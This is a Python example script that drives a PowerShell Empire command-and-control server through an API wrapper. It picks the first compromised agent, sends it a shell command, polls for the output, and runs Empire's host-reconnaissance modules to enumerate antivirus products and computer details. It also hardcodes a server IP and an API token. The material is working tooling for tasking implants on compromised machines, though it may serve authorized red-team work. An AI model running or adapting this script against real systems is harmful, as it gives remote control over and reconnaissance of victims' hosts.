import time
import EmpireAPIWrapper


def poll_result(api, agent_name, taskID, timeout=120):
    cont = True
    result = ""
    while cont:
        if timeout < 0:
            return 'timed out!'
        r = api.agent_shell_buffer(agent_name)
        time.sleep(1)
        for result in r['results']:
            if taskID == (result['taskID']):
                if not result['results'].startswith('Job'):
                    cont = False
                if 'completed!' not in result['results']:
                    continue
                else:
                    cont = False
        timeout -= 1 # need to bail out, just in case of...
    return result


if __name__ == "__main__":
                                    # change to your IP/host & token
    api = EmpireAPIWrapper.empireAPI('172.30.1.22', token='54w31t76bry5f2aakkebof8f148qfl3juykfx5jn')
    agent = api.agents()
    agent_name = agent['agents'][0]['name']

    try:
        # shell command example
        data = {'Agent': agent_name, 'command': 'date'} # date is a rather slow command
        taskID = api.agent_run_shell_cmd(agent_name, data)['taskID']
        print('new taskID = ' + str(taskID))
        print(poll_result(api,agent_name,taskID))

        # module execution Job example
        options = {'Agent': agent_name} # ie. gather from module's "info"
        taskID = api.module_exec('powershell/situational_awareness/host/antivirusproduct', options)['taskID']
        print('new taskID = ' + str(taskID))
        print(poll_result(api,agent_name,taskID))

        # module exception example (needs admin rights but session is non-elevated)
        api.module_exec('powershell/situational_awareness/host/computerdetails', options)

    except Exception as e:
        print('Error: ' + str(e))